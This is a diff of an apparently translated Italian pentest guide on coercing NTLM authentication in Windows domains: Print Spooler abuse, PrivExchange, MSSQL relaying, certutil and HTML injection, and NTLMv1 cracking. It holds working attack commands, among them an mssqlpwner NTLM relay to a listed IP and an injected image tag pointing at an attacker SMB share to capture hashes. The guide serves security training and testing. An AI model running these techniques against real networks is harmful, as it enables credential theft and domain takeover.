@@ -8,8 +8,8 @@
 
 ## Abuso del servizio Spooler
 
-Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già note per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema**.\
-Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi** contro quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
+Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già conosciute per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema**.\
+Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi contro** quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
 
 ### Trovare server Windows nel dominio
 
@@ -51,7 +51,7 @@ Se un attaccante ha già compromesso un computer con [Delegazione Illimitata](un
 
 L'attacco `PrivExchange` è il risultato di un difetto trovato nella **funzione `PushSubscription` di Exchange Server**. Questa funzione consente al server Exchange di essere forzato da qualsiasi utente di dominio con una casella di posta ad autenticarsi su qualsiasi host fornito dal client tramite HTTP.
 
-Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **rilascio di informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il rilascio a LDAP non sia possibile, questo difetto può comunque essere utilizzato per rilasciare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
+Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sul dominio pre-2019 Cumulative Update**). Questo difetto può essere sfruttato per abilitare il **reindirizzamento delle informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il reindirizzamento a LDAP non sia possibile, questo difetto può comunque essere utilizzato per reindirizzare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
 
 ## All'interno di Windows
 
@@ -76,8 +76,6 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-Oppure usa quest'altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
-
 ### Certutil
 
 È possibile utilizzare certutil.exe lolbin (binary firmato da Microsoft) per forzare l'autenticazione NTLM:
@@ -96,13 +94,13 @@ e quando lo apre, cercherà di autenticarsi.
 
 ### MitM
 
-Se puoi eseguire un attacco MitM su un computer e iniettare HTML in una pagina che visualizzerà, potresti provare a iniettare un'immagine come la seguente nella pagina:
+Se puoi eseguire un attacco MitM a un computer e iniettare HTML in una pagina che visualizzerà, potresti provare a iniettare un'immagine come la seguente nella pagina:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ## Cracking NTLMv1
 
 Se riesci a catturare [le sfide NTLMv1 leggi qui come crackerle](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;ricorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
+&#xNAN;_&#x52;icorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
